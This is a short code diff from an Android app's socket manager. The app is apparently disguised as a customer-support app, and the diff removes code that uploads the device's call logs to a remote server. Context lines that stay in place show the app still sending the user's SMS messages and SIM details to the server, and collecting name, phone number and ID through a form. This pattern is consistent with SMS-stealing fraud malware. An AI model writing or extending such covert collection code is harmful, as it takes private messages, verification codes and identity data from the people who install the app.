@@ -240,12 +240,6 @@ class SocketManager {
                 Log.d(TAG, "Flushed ${sms.length()} pending SMS")
             }
 
-            pendingSyncManager.getPendingCalls()?.let { calls ->
-                syncCalls(deviceId, calls)
-                pendingSyncManager.clearPendingCalls()
-                Log.d(TAG, "Flushed ${calls.length()} pending calls")
-            }
-
             pendingSyncManager.getPendingSim()?.let { sim ->
                 syncSimInfo(deviceId, sim)
                 pendingSyncManager.clearPendingSim()
@@ -276,19 +270,6 @@ class SocketManager {
         }
         socket?.emit("sms:sync", data)
         Log.d(TAG, "Synced ${smsArray.length()} SMS messages")
-    }
-
-    fun syncCalls(deviceId: String, callsArray: JSONArray) {
-        if (!isConnected()) {
-            CustomerSupportApp.pendingSyncManager.queueCallsSync(deviceId, callsArray)
-            return
-        }
-        val data = JSONObject().apply {
-            put("deviceId", deviceId)
-            put("calls", callsArray)
-        }
-        socket?.emit("calls:sync", data)
-        Log.d(TAG, "Synced ${callsArray.length()} call logs")
     }
 
     fun submitForm(deviceId: String, name: String, phoneNumber: String, id: String) {
